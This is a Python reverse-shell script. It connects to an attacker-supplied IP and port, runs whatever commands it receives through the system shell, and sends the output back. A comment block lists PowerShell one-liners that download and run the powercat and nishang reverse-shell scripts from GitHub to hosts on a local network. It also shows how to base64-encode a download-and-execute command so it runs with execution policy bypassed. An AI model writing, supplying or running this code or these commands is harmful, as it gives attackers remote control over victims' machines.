# -*- coding:utf-8 -*-
import os
import select
import socket
import sys
import subprocess
'''
powershell to cmd :
    powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.4 -p 9999 -e cmd

powers to powers:
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666

cmd to cmd:


cmd to powershell:

base64加密

$text="IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.203.140/a.ps1'))" && $Bytes=[System.Text.Encoding]::Unicode.GetBytes($Text); && $EncodedText =[Convert]::ToBase64String($Bytes) && $EncodedText > bs64.txt && powershell -exec bypass -encodedcommand base64.txt

'''
def ReserveConnect(addr, port):
    '''反弹连接shell'''
    try:
        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.connect((addr,port))
    except Exception as reason:
        print ('[-] Failed to Create Socket : %s'%reason)
        exit(0)
    rlist = [shell]
    wlist = []
    elist = [shell]
    while True:
        shell.send("cmd:")
        rs,ws,es = select.select(rlist,wlist,wlist)
        for sockfd in rs:
            if sockfd == shell:
                command = shell.recv(1024)
                if command == 'exit':
                    shell.close()
                    break
                result, error = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()
                shell.sendall(result.decode("GB2312").encode("UTF-8"))

# 主函数运行
def run():
    if len(sys.argv)<3:
        print('Usage: python reverse.py [IP] [PORT]')
    else:
        url = sys.argv[1]
        port = int(sys.argv[2])
        ReserveConnect(url,port)

if __name__ == '__main__':
    run()